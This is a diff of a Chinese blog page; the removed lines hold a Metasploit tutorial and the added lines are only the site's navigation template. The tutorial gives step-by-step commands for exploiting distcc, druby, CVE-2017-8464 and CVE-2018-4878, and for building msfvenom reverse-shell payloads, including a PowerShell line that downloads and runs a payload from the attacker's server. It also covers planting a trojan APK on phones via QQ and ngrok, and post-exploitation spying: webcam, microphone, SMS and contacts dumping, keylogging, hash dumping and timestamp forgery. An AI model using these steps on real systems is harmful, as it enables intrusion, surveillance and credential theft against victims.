-<p>利用步骤:<br>启动 metasploit</p>
-<p>使用 exploit/unix/misc/distcc_exec 模块</p>
-<p>set RHOSTS IP</p>
-<p>exploit 执行攻击</p>
-<p>id 查看权限， uname -a 验证</p>
-<h2 id="5-10-Druby-命令执行"><a href="#5-10-Druby-命令执行" class="headerlink" title="5.10.Druby 命令执行"></a>5.10.Druby 命令执行</h2><p>Druby 配置不当，被滥用执行命令。（Druby 是开发语言，后缀名 .rb）</p>
-<p>利用步骤：</p>
-<p>metasploit 启动</p>
-<p>发现 8787 druby 端口</p>
-<p>search drb 搜索drb 相关漏洞，找最新模块并利用 use </p>
-<p>set URL druby:IP:8787    # 设置目标druby链接    ：druby://ip地址：8787（可设置可不设置，有可能设置后还攻击不了）</p>
-<p>set RHOSTS IP</p>
-<p>exploit   攻击</p>
-<h2 id="5-11-CVE-2017-8464-震网三代-（远程快捷方式漏洞）"><a href="#5-11-CVE-2017-8464-震网三代-（远程快捷方式漏洞）" class="headerlink" title="5.11. CVE_2017_8464 震网三代 （远程快捷方式漏洞）"></a>5.11. CVE_2017_8464 震网三代 （远程快捷方式漏洞）</h2><p><strong>漏洞详情:</strong><br>北京时间2017年6月13日凌晨，微软官方发布6月安全补丁程序，“震网三代” LNK 文件远程代码执行漏洞(CVE-2017-8464)和Windows搜索远程命令执行漏洞(CVE-2017-8543) </p>
-<p>CVE-2017-8543,当Windows搜索处理内存中的对象时，存在远程执行代码漏洞。成功利用此漏洞的攻击者可以控制受影响的系统。</p>
-<p>CVE-2017-8464,当Windows系统在解析快捷方式时，存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危。</p>
-<p>攻击机：kali</p>
-<p>靶机：win7</p>
-<p>受影响的版本：win7，win8.1，win RT 8.1，win10，win Server 2008，win Server 2008 R2，win Server 2012，win Server 2012 R2，win Server 2016</p>
-<p><strong>步骤：</strong></p>
-<p>search 2017_8464</p>
-<p>use exploit/windows/fileformat/cve_2017_8464_lnk_rce</p>
-<p>set LHOST </p>
-<p>run</p>
-<p>它会生成以一堆快捷方式，我们要先把它们拷到 home 下，再拷到 window里（肉鸡）：mv /…/ /home</p>
-<p>然后，再msf中设置监听：</p>
-<p>search multi/handler</p>
-<p>use exploit/multi/handler</p>
-<p>set payload windows/meterpreter/reverse_tcp</p>
-<p>set LHOST</p>
-<p>run </p>
-<p>等待wins 点击快捷方式，当反shell 后会自动到 meterpreter 模式</p>
-<p><strong>payload2：利用powershell 快捷键</strong></p>
-<p>生成攻击文件，终端输入：</p>
-<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=ip -f psh-reflection&gt;/opt/search.psl(exe类型的也可以)</p>
-<p>然后，将 /opt/目录下的 search.psl 移到 /var/www/html/ 下：mv /opt/search.psl /var/www/html</p>
-<p>随后打开 Apache 服务：service apache2 start</p>
-<p>通过 web 访问 search.psl 文件 ：192.168.133.128/search.psl</p>
-<p>然后，在目标机器windows 上建一个快捷方式：</p>
-<p>右击新建快捷方式，输入的对象位置：powershell -windowstyle hidden -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://192.168.133.128/search.psl&#39;);test.psl&quot;">http://192.168.133.128/search.psl&#39;);test.psl&quot;</a></p>
-<p>或者用工具：shortcut exploit builder</p>
-<h2 id="5-12-flash-0day-CVE-2018-4878"><a href="#5-12-flash-0day-CVE-2018-4878" class="headerlink" title="5.12. flash 0day (CVE-2018-4878)"></a>5.12. flash 0day (CVE-2018-4878)</h2><p><strong>漏洞详情：</strong></p>
-<p>Adobe公司在当地时间2018年2月1日发布了一条安全公告:<a target="_blank" rel="noopener" href="http://helpx.adobe.com/security/products/flash-player/apsa18-01.html%E3%80%82%E5%85%AC%E5%91%8A%E7%A7%B0%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84Flash">http://helpx.adobe.com/security/products/flash-player/apsa18-01.html。公告称一个新的Flash</a> 0Day漏洞(CVE-2018-4878)已经存在野外利用，可针对Windows用户发起定向攻击。攻击者可以诱导用户打开包含恶意Flash代码文件的Microsoft Office文档、 网页、垃圾电子邮件等。</p>
-<p><strong>漏洞影响：</strong></p>
-<p>Flash Player 28.0.0.137 及其以前的所有版本</p>
-<p><strong>漏洞复现：</strong></p>
-<p>攻击机：kali</p>
-<p>目标靶机：win7 + IE8.0 + Flash Player 28.0.0.137</p>
-<ol>
-<li><p>下载 cve-2018-4878 步骤：</p>
-<p> <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/backlion/demo/master/CVE-2018-4878.rar">https://raw.githubusercontent.com/backlion/demo/master/CVE-2018-4878.rar</a> （win7 中下载）</p>
-</li>
-<li><p>解压文件后可以看到 cve-2018-4878.py 和 exploit.swf ，我们只需要 cve-2018-4878.py</p>
-</li>
-<li><p>我们需要对 cve-2018-4878.py 进行修改，原作者将 stageless 变量改为了 Ture ,我们要把它改为 stageless = False，另外不能忘记修改最后的路径，py 中是 f=open(“root/2/index.html”,”wb”)，我们 kali 中没有这个路径，所以在 kali 中要创建一个：mkdir /root/2/</p>
-</li>
-<li><p>在 kali 中生成 msf 的 shellcode （一定要注意：在老版本的kali 中生成的为333字节的 payload）</p>
-<p>命令：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.133.128 lport=4444 -f python&gt;shellcode.txt</p>
-</li>
-<li><p>然后要替换原来的 shellcode ,就是把生成的 shellcode.txt 里面的代码替换到 cve-2018-4878.py 中</p>
-</li>
-<li><p>接着，把cve-2018-4878.py 放到 /root/2 的文件夹里</p>
-</li>
-<li><p>在kali 中执行 cve-20018-4878.py 这个脚本，即可在同一目录下生成恶意的 swf 文件</p>
-</li>
-<li><p>然后，将生成的文件放到 win7 中，用IE 浏览器打开</p>
-</li>
-<li><p>在 msf 中设置监听</p>
-<p>use exploit/multi/handler</p>
-<p>set payload windows/meterpreter/reverse_tcp </p>
-<p>set LHOST,LPORT 4444(这个要和先前配置的端口一致)</p>
-<p>exploit</p>
-</li>
-</ol>
-<h2 id="5-13-生成-exe-的木马文件"><a href="#5-13-生成-exe-的木马文件" class="headerlink" title="5.13. 生成 exe 的木马文件"></a>5.13. 生成 exe 的木马文件</h2><p>命令：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.133.128 lport=6789 -f exe -o /root/payload.exe</p>
-<p>这是把木马程序存放于 kali 中，想办法传送到 win 10 中，并让其执行</p>
-<p>设置监听：</p>
-<p>msf&gt; use exploit/multi/handler</p>
-<p>set payload windows/x64/meterpreter/reverse_tcp</p>
-<p>set LHOST 192.168.133.128</p>
-<p>run</p>
-<h2 id="5-14-渗透-Android-系统"><a href="#5-14-渗透-Android-系统" class="headerlink" title="5.14. 渗透 Android 系统"></a>5.14. 渗透 Android 系统</h2><h3 id="5-14-1-渗透步骤"><a href="#5-14-1-渗透步骤" class="headerlink" title="5.14.1. 渗透步骤"></a>5.14.1. 渗透步骤</h3><h4 id="1-内网渗透"><a href="#1-内网渗透" class="headerlink" title="1. 内网渗透"></a>1. 内网渗透</h4><ol>
-<li><p>首先要把 Kali 攻击机 配置为 桥接模式，因为渗透 Android 系统 要在局域网下，所以 kali ，物理机，Android 要在同一网段下，这样三者之间可以互相 ping 通。</p>
-<p>同一个局域网就是要在同一个 WIFI 下。</p>
-</li>
-<li><p>kali 机器要生成攻击脚本：</p>
-<p>命令：msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.111 LPORT=9999 R&gt;/root/test.apk</p>
-<p>生成一个 apk 的脚本后，存放在 root 的目录下，复制到 window中，通过 QQ 发送到手机上，下载安装运行</p>
-</li>
-<li><p>这时，kali 要设置监听：</p>
-<p>进入 msfconsole</p>
-<p>使用 exploit/multi/handler 模块：use exploit/multi/handler</p>
-<p>设置payload：set payload android/meterpreter/reverse_tcp</p>
-<p>设置监听的攻击机 IP：set LHOST 192.168.0.111</p>
-<p>设置监听端口：set LPORT 9999                      （IP 和 端口和上面脚本设置一致）</p>
-<p>渗透：run  /  exploit</p>
-<p>当脚本在手机中被运行时，kali 就会接受到信号，进入 meterpreter 的命令行</p>
-</li>
-</ol>
-<h4 id="2-外网渗透"><a href="#2-外网渗透" class="headerlink" title="2. 外网渗透"></a>2. 外网渗透</h4><ol>
-<li><p>首先我们需要下载一个用于内网穿透的工具来进行端口映射与转发。</p>
-<p>这里就用 Ngrok ，这个软件可以有免费版的（网速不行，不稳定，自娱自乐吧）</p>
-<p>在官网上注册并登录（<a target="_blank" rel="noopener" href="https://www.ngrok.cc/#down-client%EF%BC%89">https://www.ngrok.cc/#down-client）</a></p>
-</li>
-<li><p>kali进入 ngrok 查看连接状态，命令：</p>
-<p>./sunny clientid 你的id（这个id 在 ngrok 隧道管道中可以看到）</p>
-<p>利用转发的 tcp 和端口号</p>
-</li>
-<li><p>kali 机器要生成攻击脚本：</p>
-<p>命令：msfvenom -p android/meterpreter/reverse_tcp LHOST=free.idcfengye.com LPORT=10227 R&gt;/home/haoye/haoye.apk</p>
-<p>生成一个 apk 的脚本后，存放在 /home/haoye 的目录下，复制到 window中，通过 QQ 发送到手机上，下载安装运行</p>
-</li>
-<li><p>kali 要设置监听（和上面内网渗透设置步骤一样）</p>
-</li>
-</ol>
-<p>Ngrok 注册安装可以看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45798017/article/details/108564464">https://blog.csdn.net/weixin_45798017/article/details/108564464</a></p>
-<h3 id="5-14-2-后期-处理"><a href="#5-14-2-后期-处理" class="headerlink" title="5.14.2. 后期 处理"></a>5.14.2. 后期 处理</h3><ol>
-<li><p>手机拍照</p>
-<p>webcam_list              #查看摄像头  （1 是后置，2是前置，但是我没看出什么不同）</p>
-<p>webcam_snap 1/2      #拍照</p>
-<p>webcam_stream 1/2   #摄像，录视频</p>
-</li>
-<li><p>手机录音</p>
-<p>record_mic</p>
-</li>
-<li><p>查看Android手机是否已经执行root权限</p>
-<p>check_root</p>
-</li>
-<li><p>导出Android手机的电话本</p>
-<p>dump_contacts</p>
-</li>
-<li><p>导出Android手机的短信记录</p>
-<p>dump_sms</p>
-</li>
-<li><p>远程控制目标手机发送短信</p>
-<p>send_sms -d 其他手机号 -t “内容”</p>
-</li>
-<li><p>对目标手机进行定位，查看目标手机位置信息</p>
-<p>geolocate</p>
-</li>
-<li><p>查看所有可执行命令</p>
-<p>?</p>
-</li>
-</ol>
-<p>优点：该脚本不会报毒</p>
-<p>弊端：上面的操作都得有权限，也就是手机下桌面的这个脚本的信息中的权限光有 “询问” 的权限是不够的，必须是 “允许”。</p>
-<h1 id="六-拓展：Auxiliary（辅助）模块"><a href="#六-拓展：Auxiliary（辅助）模块" class="headerlink" title="六.拓展：Auxiliary（辅助）模块"></a>六.拓展：Auxiliary（辅助）模块</h1><p><strong>Auxiliary模块</strong></p>
-<p>情报搜集阶段,这一阶段主要是尽可能多的收集目标的各种信息。这里主要用到Msf里auxiliary里边的Modules，这里的Modules都是一些渗透前期的辅助工具。一般的收集信息可以使用Whois(这个是Linux 自带的)，db_ nmap这个是Msf的一个插件) ,如果要使用到其他的一些收集信息的方法，比如使用Syn(一种不建立头层皮连接的扫描)扫描，可以在Msfconsole里边Search syn然后根据返回结果来确定使用哪个模块。</p>
-<ol>
-<li><p>Whois信息探测：在Mstconsole下使用Whois查看域名(domin) / IP信息。：whois + 域名/IP</p>
-</li>
-<li><p>利用模块查找邮箱：use auxiliary/gather/search_email_collector</p>
-</li>
-<li><p>因为 Google 国内引擎关闭了，所以我们设置不用Google引擎：set SEARCH_GOOGLE false(不关闭的话搜索时间就长一些)，然后 run 进行搜索</p>
-</li>
-<li><p>使用 auxiliary 下的搜索 DNS 的模块：use auxiliary/gather/enum_dns，设置DNS时不要加www，然后 run 进行爆破</p>
-</li>
-</ol>
-<h1 id="七-拓展：Nmap-端口扫描-模块"><a href="#七-拓展：Nmap-端口扫描-模块" class="headerlink" title="七. 拓展：Nmap (端口扫描) 模块"></a>七. 拓展：Nmap (端口扫描) 模块</h1><p>msf 内置 nmap 端口扫描模块，效果和 kali 中自带的 nmap 是一致的</p>
-<h2 id="7-1-Syn-扫描"><a href="#7-1-Syn-扫描" class="headerlink" title="7.1 Syn 扫描"></a>7.1 Syn 扫描</h2><p>如果TCP 扫描访问被拦截，就可以利用 syn 扫描（不建立连接的扫描）</p>
-<p>扫描器向目标主机的一个端口发送请求连接的 SYN 包，扫描器在收到 SYN / ACK 后，不是发送的 ACK 应答而是发送RST 包请求断开连接。这样，三次握手就没有完成，无法建立正常的 TCP 连接，因此，这次扫描就不会被记录到系统日志中。这种扫描技术一般不会在目标主机上留下扫描痕迹。但是，这种扫描需要有 root 权限。<br>TCP connect 端口扫描服务端与客户端建立连接成功(目标端口开放)</p>
-<p><strong>过程:</strong></p>
-<ol>
-<li>Client 端发送SYN;</li>
-<li>Server端返回SYN/ACK，表明端口开放;（如果返回 RST/ACK 表明端口未开放）</li>
-<li>Client端返回ACK，表明连接已建立；</li>
-<li>Client端主动断开连接。</li>
-</ol>
-<p><strong>优点：</strong></p>
-<p>SYN扫描要比TCP Connect()扫描隐蔽些,SYN仅仅需要发送初始的SYN数据包给目标主机,如果端口开放,则相应SYN-ACK数据包;如果关闭，则响应 RST 数据包。</p>
-<p><strong>步骤：</strong></p>
-<ol>
-<li>use auxiliary/scanner/portscan/syn</li>
-<li>set RHOSTS 192.168.134.1..</li>
-<li>set THREADS 100   #设置线程，默认的是1，这里我们设置成100</li>
-<li>run  进行扫描</li>
-</ol>
-<h2 id="7-2-Tcp-扫描"><a href="#7-2-Tcp-扫描" class="headerlink" title="7.2 Tcp 扫描"></a>7.2 Tcp 扫描</h2><ol>
-<li>use auxiliary/scanner/portscan/tcp</li>
-<li>set RHOSTS</li>
-<li>set THREADS 100</li>
-<li>run 进行扫描</li>
-</ol>
-<h1 id="八-服务版本信息探索"><a href="#八-服务版本信息探索" class="headerlink" title="八. 服务版本信息探索"></a>八. 服务版本信息探索</h1><h2 id="8-1-SMB-版本扫描"><a href="#8-1-SMB-版本扫描" class="headerlink" title="8.1. SMB 版本扫描"></a>8.1. SMB 版本扫描</h2><ol>
-<li>执行 use auxiliary/scanner/smb/smb_version</li>
-<li>show options  查看要哪些配置</li>
-<li>set RHOSTS IP</li>
-</ol>
-<h2 id="8-2-SSH-版本扫描"><a href="#8-2-SSH-版本扫描" class="headerlink" title="8.2. SSH 版本扫描"></a>8.2. SSH 版本扫描</h2><ol>
-<li>执行 use auxiliary/scanner/ssh/ssh_version</li>
-<li>show options  查看需要哪些配置</li>
-<li>set RHOSTS IP</li>
-<li>run</li>
-</ol>
-<h2 id="8-3-FTP-版本扫描"><a href="#8-3-FTP-版本扫描" class="headerlink" title="8.3. FTP 版本扫描"></a>8.3. FTP 版本扫描</h2><ol>
-<li>执行 use auxiliary/scanner/ftp/ftp_version</li>
-<li>show options  查看需要哪些配置</li>
-<li>set RHOSTS IP</li>
-<li>run</li>
-</ol>
-<h1 id="九-Meterpreter的后期攻击使用方法"><a href="#九-Meterpreter的后期攻击使用方法" class="headerlink" title="九.Meterpreter的后期攻击使用方法"></a>九.Meterpreter的后期攻击使用方法</h1><h2 id="9-1-上传文件到Windows主机"><a href="#9-1-上传文件到Windows主机" class="headerlink" title="9.1.上传文件到Windows主机"></a>9.1.上传文件到Windows主机</h2><p>简单地来说，你可以上传本机的任意文件到目标主机，</p>
-<p>命令：<code>upload&lt;file&gt;&lt;destination&gt;</code>        </p>
-<p>(注意，file是包括它自己的路径的，同时，使用 -r 参数可以递归上传要上传的目录和文件)</p>
-<p>例如：<code>upload -r /home/haoye.exe c:\\</code> （注意，这里要有两个 \ )</p>
-<h2 id="9-2-从Windows主机上下载文件"><a href="#9-2-从Windows主机上下载文件" class="headerlink" title="9.2.从Windows主机上下载文件"></a>9.2.从Windows主机上下载文件</h2><p>download命令可以下载远程主机里的文件</p>
-<p>命令：<code>download&lt;file&gt;&lt;path to save&gt;</code>               例如：<code>download C://haoye.rtf /home</code></p>
-<p>注意：Windows路径要加双斜线，我们如果要递归下载整个目录包括子目录和文件，我们可以使用download -r 的命令</p>
-<p>例如：</p>
-<h2 id="9-3-在目标主机上执行-exe-文件"><a href="#9-3-在目标主机上执行-exe-文件" class="headerlink" title="9.3.在目标主机上执行 exe 文件"></a>9.3.在目标主机上执行 exe 文件</h2><p>我们也可以用 execute 命令在目标主机上执行exe的应用程序</p>
-<p>命令：<code>execute -f &lt;path&gt;[options]</code></p>
-<p>例如：<code>execute -f c:\\haoye.exe</code>(双反斜杠)</p>
-<h2 id="9-4-创建CMD新通道"><a href="#9-4-创建CMD新通道" class="headerlink" title="9.4.创建CMD新通道"></a>9.4.创建CMD新通道</h2><p>如果想在目标主机执行命令提示符</p>
-<p>命令：<code>execute -f cmd -c</code>(这都是在 meterpreter 模式下的操作，类似于 shell 的命令)</p>
-<h2 id="9-5-显示进程"><a href="#9-5-显示进程" class="headerlink" title="9.5.显示进程"></a>9.5.显示进程</h2><p>ps命令会显示目标主机所有正在运行的进程</p>
-<p>命令：<code>ps</code>  （和windows任务管理器查看内容是一样的）</p>
-<h2 id="9-6-获取admin权限"><a href="#9-6-获取admin权限" class="headerlink" title="9.6.获取admin权限"></a>9.6.获取admin权限</h2><p>getsystem命令可以提权到本地系统权限</p>
-<p>命令：<code>getsystem</code></p>
-<h2 id="9-7-使用-Hashdump-转储所有-hash-值"><a href="#9-7-使用-Hashdump-转储所有-hash-值" class="headerlink" title="9.7.使用 Hashdump 转储所有 hash 值"></a>9.7.使用 Hashdump 转储所有 hash 值</h2><p>我么可以使用 meterpreter shell 来 dump 目标主机当前系统账户和密码，转储的内容是 NTLM 哈希格式</p>
-<p>NTLM 在线破解 ：<a target="_blank" rel="noopener" href="http://hashkiller.co.uk/ntlm-decrypter.aspx">http://hashkiller.co.uk/ntlm-decrypter.aspx</a></p>
-<p>命令：<code>hashdump</code></p>
-<p>输出的每一行格式如下：usrname：ID…..</p>
-<p>它会得到几个不同权限的账号和 hash 密码</p>
-<h2 id="9-8-使用-Credcollect-转储-hash-值"><a href="#9-8-使用-Credcollect-转储-hash-值" class="headerlink" title="9.8.使用 Credcollect 转储 hash 值"></a>9.8.使用 Credcollect 转储 hash 值</h2><p>还有一个类似的脚本叫 credential_collector ,也可以收集目标主机的 tokens </p>
-<p>命令：<code>run credcollect</code></p>
-<h2 id="9-9-创建端口转发"><a href="#9-9-创建端口转发" class="headerlink" title="9.9.创建端口转发"></a>9.9.创建端口转发</h2><p>用途：当对方主机是在内网的情况下</p>
-<p>meterpreter shell中的portfwd命令是转发技术中最常用的一个命令， 可以让攻击系统访问本来无法直接访问的目标主机。<br>add选项会将端口转发添加到列表中，而且本质上会创建一个隧道。</p>
-<p>请注意:这个隧道存在于 meterpreter 控制台之外，任何终端会话都可以使用。</p>
-<p>命令：portfwd add -l 6666 -p 3389 -r 127.0.0.1        #将目标机的3389端口转发到本地6666端口。(本地端口不能被占用)</p>
-<h2 id="9-10-删除端口转发"><a href="#9-10-删除端口转发" class="headerlink" title="9.10.删除端口转发"></a>9.10.删除端口转发</h2><p>和创建端口转发命令类似，这条命令是删除一条端口转发记录</p>
-<p>命令：<code>portfwd delete -l &lt;portnumber&gt; -p &lt;portnumber&gt; -r &lt;Target IP&gt;</code> n</p>
-<p>如果你想显示所有端口转发记录，你可以使用 portfwd list 命令，</p>
-<p>如果你想删除所有端口转发记录，你可以使用 portfwd flush 命令。</p>
-<h2 id="9-11-在目标主机上搜索文件"><a href="#9-11-在目标主机上搜索文件" class="headerlink" title="9.11.在目标主机上搜索文件"></a>9.11.在目标主机上搜索文件</h2><p>搜索命令可以定位查找目标主机上特定的文件，这个命令可以搜索整个文件系统，也可以用来搜索特定的文件夹。</p>
-<p>例如，如果你想搜索目标主机上的所有 txt 文件，可以使用如下命令；</p>
-<p>命令：search -f *.txt</p>
-<h2 id="9-12-获取用户-ID"><a href="#9-12-获取用户-ID" class="headerlink" title="9.12.获取用户 ID"></a>9.12.获取用户 ID</h2><p>getuid 命令会显示主机上与运行 meterpreter 服务的用户</p>
-<p>命令：getuid</p>
-<h2 id="9-13-获取系统信息"><a href="#9-13-获取系统信息" class="headerlink" title="9.13.获取系统信息"></a>9.13.获取系统信息</h2><p>sysinfo 命令会显示 系统名，操作系统，架构 ，语言等。</p>
-<p>命令：sysinfo</p>
-<h2 id="9-14-模拟任何用户（token-操作）"><a href="#9-14-模拟任何用户（token-操作）" class="headerlink" title="9.14.模拟任何用户（token 操作）"></a>9.14.模拟任何用户（token 操作）</h2><p>这个进程对于攻击像微软活动目录这样的分布式系统非常有帮助，因为在微饮活动目录中，本地访问权限并没多大用，但是如果能搞到凭证尤其是管理员凭证，那就非常有用了。</p>
-<p>incognito 最开始是一个独立的应用，当你成功入侵系统后可以用它来模拟用户tokens。这个应用后来集成到了metaploit 中,并且最终集成到了meterpreter 中，使用如下:</p>
-<ol>
-<li><p>在 meterpreter 会话中加载这个模块非常简单，只要输入use incognito 命令即可。</p>
-</li>
-<li><p>输入list_tokens -u 来显示所有有效的tokens</p>
-</li>
-<li><p>然后我们需要模拟某个token来获取其权限。还有注意，如果成功模拟了一个token，我们可以使用 getuid 命令来检查当前用户ID。</p>
-</li>
-<li><p>切换到最高权限（SYSTEM），输入：impersonate_token “NT AUTHORITY\SYSTEM”   (注意：SYSTEM权限是比管理员还要高的)</p>
-<p>use incognito -&gt;list_tokens -u -&gt; getuid -&gt; impersonate_token “NT AUTHORITY\SYSTEM”</p>
-</li>
-</ol>
-<h2 id="9-15-webcam-摄像头命令"><a href="#9-15-webcam-摄像头命令" class="headerlink" title="9.15 webcam 摄像头命令"></a>9.15 webcam 摄像头命令</h2><p>webcam_list  ：查看摄像头</p>
-<p>webcam_snap  ：通过摄像头拍照</p>
-<p>webcam_stream ：通过摄像头开启视频</p>
-<h2 id="9-16-execute-执行文件"><a href="#9-16-execute-执行文件" class="headerlink" title="9.16. execute 执行文件"></a>9.16. execute 执行文件</h2><p>execute  ：在目标机中执行文件</p>
-<p>execute -H / -i -f cmd.exe    # 创建新的 cmd 进程；-H 不可见；-i 交互(-i 不要加，加了在目标主机就会看到CMD的命令符界面)</p>
-<h2 id="9-17-timestomp-伪造时间戳"><a href="#9-17-timestomp-伪造时间戳" class="headerlink" title="9.17. timestomp 伪造时间戳"></a>9.17. timestomp 伪造时间戳</h2><p>timestomp C:// -h       #查看帮助</p>
-<p>timestomp -v C://2.txt     #查看时间戳</p>
-<p>timestomp C://2.txt -f C://1.txt     #将1.txt 的时间戳复制给 2.txt （-f 的参数是复制的意思，后面的复制给前面）（不能找正在运行的文件，将其日期赋值给别的文件，否则会失败的）</p>
-<h2 id="9-18-查看盘的所有文件和时间"><a href="#9-18-查看盘的所有文件和时间" class="headerlink" title="9.18. 查看盘的所有文件和时间"></a>9.18. 查看盘的所有文件和时间</h2><p><code>dir C:\\</code>(双斜杠)     #查看C盘所有文件及日期</p>
-<h2 id="9-19-enable-rdp-脚本开启3389（远程桌面连接）"><a href="#9-19-enable-rdp-脚本开启3389（远程桌面连接）" class="headerlink" title="9.19. enable_rdp 脚本开启3389（远程桌面连接）"></a>9.19. enable_rdp 脚本开启3389（远程桌面连接）</h2><p>run post/windows/manage/enable_rdp    #开启远程桌面</p>
-<p>run post/windows/manage/enable_rdp USERNAME=haoye PASSWORD=12345   #添加用户密码</p>
-<p>run post/windows/manage/enable_rdp FORWARD=true LPORT=6662    #将3389端口转发到6662</p>
-<p>脚本位于：/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb</p>
-<p>通过 rdp.rb 脚本可知：开启 rdp 是通过 reg 修改注册表；添加用户是调用 cmd.exe 通过net user 添加；</p>
-<p>端口转发是利用 portfwd 命令。</p>
-<h2 id="9-20-键盘记录（这个得靠运气）"><a href="#9-20-键盘记录（这个得靠运气）" class="headerlink" title="9.20. 键盘记录（这个得靠运气）"></a>9.20. 键盘记录（这个得靠运气）</h2><p>keyscan_start       #开启键盘记录</p>
-<p>keyscan_dump     #导出记录数据</p>
-<p>keyscan_stop       #结束键盘记录</p>
-<p>其他详细信息，查看：<a target="_blank" rel="noopener" href="http://xz.aliyun.com/t/2536%EF%BC%88%E5%88%AB%E4%BA%BA%E7%9A%84%E5%8D%9A%E5%AE%A2%EF%BC%89">http://xz.aliyun.com/t/2536（别人的博客）</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/07/04/MSF/" data-id="ckf55olqx0000acw96yj2emcs" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-
-  
-    
-
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2020/07/04/MSF/">(no title)</a>
-          </li>
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
         
       </ul>
     </div>
-  </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+            <img no-lazy class='logo' src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
+          
+          
+          
+        </a>
+      
 
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  <div class="l_body">
+    <div class="l_cover">
   
-</aside>
+    
+    
+        <div class='cover-wrapper  dock' style="display: none;">
+          
+            <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg"></div>
+          
+          <div class='cover-body'>
+  <div class='top'>
+    
+    
+      <p class="title">Sculptor</p>
+    
+    
+  </div>
+  <div class='bottom'>
+    <div class='menu navigation'>
+      <div class='list-h'>
+        
+          
+            <a href="/"
+              
+              
+              id="home">
+              <img src='https://cdn.jsdelivr.net/gh/twitter/twemoji@13.0/assets/svg/1f4f0.svg'><p>博客</p>
+            </a>
+          
